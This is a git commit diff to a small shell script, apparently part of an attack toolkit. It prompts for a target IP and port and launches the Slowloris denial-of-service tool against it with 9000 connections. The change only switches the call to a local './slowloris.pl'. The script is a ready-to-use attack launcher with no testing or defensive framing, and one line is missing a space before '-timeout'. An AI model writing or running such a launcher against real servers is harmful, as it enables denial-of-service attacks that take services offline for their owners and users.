bfb8ccc5d49f51bed809c36d37fde9f135535830
H7XX <88547689+H7XX@users.noreply.github.com>
2021-08-06 19:13:42 -0300

    Update slowconfig.sh

--- requisitos/slowconfig.sh
+++ requisitos/slowconfig.sh
@@ -8,12 +8,12 @@ case "$escolha2" in
 	S)
 		read -p "ip: " ip2
 		read -p "porta: " port2
-		slowloris -dns $ip2 -port $port2 -timeout 1 -num 9000 -tcpto 5 
+		./slowloris.pl -dns $ip2 -port $port2 -timeout 1 -num 9000 -tcpto 5 
 	;;
 
 	N)
 		read -p "ip: " ip3 
-		slowloris -dns $ip3-timeout 1 -num 9000 -tcpto 5 
+		./slowloris.pl -dns $ip3-timeout 1 -num 9000 -tcpto 5 
 	;;
 
 	esac
